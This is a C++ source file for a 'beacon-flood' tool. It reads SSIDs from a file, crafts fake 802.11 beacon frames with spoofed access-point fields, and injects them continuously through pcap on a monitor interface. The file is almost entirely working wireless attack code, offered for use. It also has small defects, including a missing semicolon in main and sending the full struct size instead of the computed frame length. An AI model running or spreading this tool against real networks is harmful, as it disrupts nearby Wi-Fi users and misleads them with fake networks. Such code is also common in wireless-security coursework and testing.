#include "radio.h"
#include "dot11.h"
#include "mac.h"

#include <iostream>
#include <cstdio>
#include <pcap.h>
#include <signal.h>
#include <string>
#include <vector>
#include <fstream>
#include <unistd.h>

using namespace std;
bool attack = true;

vector<string> list;
vector<beaconFrame> packets;
vector<string> SSIDList;

void usage(){
    printf("syntax : beacon-flood <interface> <ssid-list-file>\n");
    printf("sample : beacon-flood mon0 ssid-list.txt\n");
    return;
}

void sig_handler(int signo){
    attack = false;
    return;
}

void get_list(string& msgFile){
    std::string SSID;
    ifstream ifs(msgFile.data(), std::ios::in);
    if(ifs.fail()) return;
    while(not ifs.eof()) {
        getline(ifs, SSID);
        if(SSID.empty()) break;

        SSIDList.push_back(SSID);
    }
}

void init(beaconFrame& packet) {
    packet.radioHdr.it_version = 0;
    packet.radioHdr.it_pad = 0;
    packet.radioHdr.it_len = sizeof(radiotap);
    packet.radioHdr.it_present = 0;

    packet.beaconHdr.version = 0;
    packet.beaconHdr.type = Dot11Hdr::MANAGEMENT_FRAMES;
    packet.beaconHdr.subtype = Dot11Hdr::Beacon;
    packet.beaconHdr.flags = 0;
    packet.beaconHdr.duration = 0;
    packet.beaconHdr.addr1_ = Mac::broadcastMac();
    packet.beaconHdr.addr2_ = Mac::nullMac();
    packet.beaconHdr.addr3_ = Mac::nullMac();
    packet.beaconHdr.frag = 0;
    packet.beaconHdr.seq = 0;

    packet.beaconHdr.fix.timestamp = 0;
    packet.beaconHdr.fix.beaconInterval = 0x6400;
    packet.beaconHdr.fix.capabilities = 0x0011;
}

void set_packet(string& SSID, beaconFrame& packet){
    init(packet);
    beaconHeader::Tag* tag = packet.beaconHdr.firstTag();
    tag->identifier = beaconHeader::TagSsidParameterSet;
    tag->length = SSID.size();
    memcpy((uint8_t*)tag->value(), SSID.data(), SSID.size());
    tag = tag->next();

    tag->identifier = beaconHeader::TagSupportedRated;
    tag->length = 8;
    uint8_t* pointer = (uint8_t*)tag->value();
    *pointer++ = 0x82;
    *pointer++ = 0x84;
    *pointer++ = 0x8b;
    *pointer++ = 0x96;
    *pointer++ = 0x24;
    *pointer++ = 0x30;
    *pointer++ = 0x48;
    *pointer++ = 0x6c;
    tag = tag->next();

    tag->identifier = beaconHeader::TagDsParameterSet;
    tag->length = 1;
    (*(uint8_t*)tag->value()) = 3;
    tag = tag->next();

    tag->identifier = beaconHeader::TagTrafficIndicationMap;
    tag->length = sizeof(beaconHeader::TrafficIndicationMap) - sizeof(beaconHeader::Tag);
    beaconHeader::TrafficIndicationMap* tim = (beaconHeader::TrafficIndicationMap*)(tag);
    tim->DITMCount = 0;
    tim->DITMPeriod = 3;
    tim->bitmapControl = 0;
    tim->partialVirtiualBitmap = 0;
    tag = tag->next();

    uint8_t vender[] = "\xdd\x18\x00\x50\xf2\x01\x01\x00\x00\x50\xf2\x04\x01\x00\x00\x50\xf2\x04\x01\x00\x00\x50\xf2\x02\x00\x00";
    memcpy(tag, vender, sizeof(vender) - 1);
    tag = tag->next();

    packet.size = (uint8_t*)tag - (uint8_t*)(&packet);
    packets.push_back(packet);
}

int main(int argc, char* argv[]){
    if(argc != 3){
        usage();
        return 0;
    }    

    string name(argv[2])
    get_list(name);

    // pcap default 
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
		return -1;
	}


    signal(SIGINT,sig_handler);

    for(string& SSID : SSIDList){
        beaconFrame packet;
        set_packet(SSID, packet);
    }

    while(attack){
        for(beaconFrame& packet : packets){
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
            if (res != 0) fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            sleep(1);
        }
    }

    pcap_close(handle);
    return 0;
}